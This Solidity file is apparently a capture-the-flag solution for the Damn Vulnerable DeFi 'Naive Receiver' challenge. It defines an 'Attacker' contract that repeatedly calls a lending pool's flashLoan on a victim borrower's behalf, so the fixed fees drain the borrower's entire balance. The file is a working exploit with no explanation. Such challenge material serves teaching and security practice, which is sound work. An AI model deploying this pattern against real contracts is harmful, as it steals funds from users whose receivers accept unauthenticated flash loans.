// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver - Attacker
 * @author Valentin Staykov - https://github.com/Bludya/damn-vulnerable-def-solutions
 */
contract Attacker {
    using Address for address;

    function attack(address payable poolAddr, address borrower, uint256 borrowAmount) public payable {
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(poolAddr);

        uint256 fee = pool.fixedFee();
        uint256 borrowerBalance = address(borrower).balance;
        uint256 turns = borrowerBalance / fee;

        for(uint32 i=0; i < turns; i++) {
            pool.flashLoan(borrower, borrowAmount);
        }
    }
}